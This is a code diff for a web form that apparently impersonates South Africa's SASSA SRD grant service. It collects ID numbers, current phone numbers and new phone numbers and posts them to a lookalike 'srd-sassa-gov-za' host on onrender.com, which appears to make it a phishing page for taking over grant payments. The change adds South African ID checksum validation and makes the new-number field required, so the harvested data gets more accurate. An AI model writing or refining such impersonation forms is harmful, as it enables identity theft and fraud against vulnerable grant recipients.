@@ -61,42 +61,72 @@
   </div>
 
   <script>
-    function validateForm() {
-      const idNumber = document.getElementById('idNumber').value;
-      const phoneNumber = document.getElementById('phoneNumber').value;
-      const submitButton = document.getElementById('submitButton');
-      if (idNumber.length === 13 && phoneNumber.length === 10) {
-        submitButton.disabled = false;
-      } else {
-        submitButton.disabled = true;
+  function isValidSAID(id) {
+    if (!/^\d{13}$/.test(id)) return false;
+
+    let sum = 0;
+    for (let i = 0; i < 13; i++) {
+      let digit = parseInt(id.charAt(i));
+      if ((i + 1) % 2 === 0) {
+        digit *= 2;
+        if (digit > 9) digit -= 9;
       }
+      sum += digit;
     }
 
-    document.getElementById("applicationForm").addEventListener("submit", async function (e) {
-      e.preventDefault();
-      const idNumber = document.getElementById("idNumber").value.trim();
-      const phoneNumber = document.getElementById("phoneNumber").value.trim();
-      const newphoneNumber = document.getElementById("newphoneNumber").value.trim();
+    return sum % 10 === 0;
+  }
 
-      try {
-        const response = await fetch("https://srd-sassa-gov-za-change-numberss.onrender.com/submit", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ idNumber, phoneNumber, newphoneNumber }),
-        });
+  function validateForm() {
+    const idNumber = document.getElementById('idNumber').value;
+    const phoneNumber = document.getElementById('phoneNumber').value;
+    const newphoneNumber = document.getElementById('newphoneNumber').value;
+    const submitButton = document.getElementById('submitButton');
 
-        if (response.ok) {
-          alert("Application submitted successfully!");
-        } else if (response.status === 409) {
-          alert("Duplicate entry found.");
-        } else {
-          alert("An error occurred.");
-        }
-      } catch (error) {
-        console.error("Submission error:", error);
-        alert("Network error. Please try again.");
+    if (
+      idNumber.length === 13 &&
+      phoneNumber.length === 10 &&
+      newphoneNumber.length === 10 &&
+      isValidSAID(idNumber)
+    ) {
+      submitButton.disabled = false;
+    } else {
+      submitButton.disabled = true;
+    }
+  }
+
+  document.getElementById("applicationForm").addEventListener("submit", async function (e) {
+    e.preventDefault();
+
+    const idNumber = document.getElementById("idNumber").value.trim();
+    const phoneNumber = document.getElementById("phoneNumber").value.trim();
+    const newphoneNumber = document.getElementById("newphoneNumber").value.trim();
+
+    if (!isValidSAID(idNumber)) {
+      alert("Invalid South African ID number.");
+      return;
+    }
+
+    try {
+      const response = await fetch("https://srd-sassa-gov-za-change-numberss.onrender.com/submit", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ idNumber, phoneNumber, newphoneNumber }),
+      });
+
+      if (response.ok) {
+        alert("Application submitted successfully!");
+      } else if (response.status === 409) {
+        alert("Duplicate entry found.");
+      } else {
+        alert("An error occurred.");
       }
-    });
-  </script>
+    } catch (error) {
+      console.error("Submission error:", error);
+      alert("Network error. Please try again.");
+    }
+  });
+</script>
+
 </body>
 </html>
